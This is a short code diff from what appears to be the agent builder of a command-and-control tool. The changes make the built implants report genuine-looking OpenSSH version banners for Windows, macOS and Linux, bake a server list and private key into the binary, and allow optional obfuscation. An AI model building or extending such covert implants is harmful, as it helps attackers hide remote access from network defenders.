@@ -181,8 +181,6 @@ func (a *AgentCmd) cmdGenerate(cmd *cobra.Command, args []string) error {
 		return fmt.Errorf("failed to build agent: %w", err)
 	}
 
-	return nil // TODO: fix
-
 	// Get agent hash
 	agentPath := filepath.Join(constants.AgentDir, name)
 	agentBytes, err := os.ReadFile(agentPath)
@@ -192,7 +190,7 @@ func (a *AgentCmd) cmdGenerate(cmd *cobra.Command, args []string) error {
 	agentHash := strconv.FormatUint(xxhash.Sum64(agentBytes), 10)
 
 	// Add agent to database
-	agent, err = a.db.CreateAgent(cmd.Context(), name, goos, goarch, servers[0], shared, pie, garble, ss, agentHash, agentPath, pubKey) // TODO: fix
+	agent, err = a.db.CreateAgent(cmd.Context(), name, goos, goarch, servers, shared, pie, garble, ss, agentHash, agentPath, pubKey) // TODO: fix
 	if err != nil {
 		return fmt.Errorf("failed to add agent to database: %w", err)
 	}
@@ -329,10 +327,10 @@ func buildAgent(tmpDir string, builderConfig BuilderConfig) (string, error) {
 	}
 
 	// Rename agent
-	sshVersion := "OpenSSH"
+	sshVersion := "SSH-2.0-OpenSSH_8.2"
 	name := builderConfig.Name
 	if builderConfig.OS == "windows" {
-		sshVersion = "OpenSSH_for_Windows_9.5"
+		sshVersion = "SSH-2.0-OpenSSH_for_Windows_9.5"
 		if builderConfig.Shared {
 			name = fmt.Sprintf("%s.dll", name)
 		} else {
@@ -340,13 +338,13 @@ func buildAgent(tmpDir string, builderConfig BuilderConfig) (string, error) {
 		}
 	}
 	if builderConfig.OS == "darwin" {
-		sshVersion = "OpenSSH_9.9"
+		sshVersion = "SSH-2.0-OpenSSH_9.9"
 		if builderConfig.Shared {
 			name = fmt.Sprintf("%s.dylib", name)
 		}
 	}
 	if builderConfig.OS == "linux" {
-		sshVersion = "OpenSSH_9.2"
+		sshVersion = "SSH-2.0-OpenSSH_9.2"
 		if builderConfig.Shared {
 			name = fmt.Sprintf("%s.so", name)
 		}
@@ -366,7 +364,7 @@ func buildAgent(tmpDir string, builderConfig BuilderConfig) (string, error) {
 	}
 
 	ldflags = fmt.Sprintf("%s -X main.privKey=%s", ldflags, privKeyBase64)
-	ldflags = fmt.Sprintf("%s -X main.serverAddress=%s", ldflags, servers)
+	ldflags = fmt.Sprintf("%s -X main.servers=%s", ldflags, servers)
 	ldflags = fmt.Sprintf("%s -X main.sshVersion=%s", ldflags, sshVersion)
 	ldflags = fmt.Sprintf("%s -buildid=", ldflags)
 
